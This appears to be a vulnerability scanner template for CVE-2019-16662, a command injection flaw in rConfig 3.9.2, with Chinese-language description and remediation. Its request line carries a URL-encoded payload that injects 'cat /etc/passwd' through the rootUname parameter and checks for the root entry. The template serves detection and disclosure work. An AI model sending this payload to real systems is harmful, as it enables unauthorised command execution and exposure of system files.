id: CVE-2019-16662
info:
  name: rConfig 3.9.2 Remote Code Execution
  author:
  - l0ne1y
  tags:
  - cve
  - cve2019
  - rce
  - intrusive
  - rconfig
  description: |-
    rConfig 操作系统命令注入漏洞
    rConfig是一款开源的网络配置管理实用程序。

    rConfig 3.9.2版本中存在安全漏洞，该漏洞源于‘rootUname’参数未经过滤便直接发送到‘exec’函数中。攻击者可利用该漏洞执行系统命令。
  reference:
  - https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/
  - https://nvd.nist.gov/vuln/detail/cve-2019-16662
  - https://drive.google.com/open?id=1oxi5cnuwwqc6y-7bgncfyhgfpk2cpvnu
  severity: critical
  classification:
    cve-id:
    - cve-2019-16662
    cwe-id:
    - cwe-78
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://rconfig.com
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  path:
  - '{{BaseURL}}/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23'
  method: GET
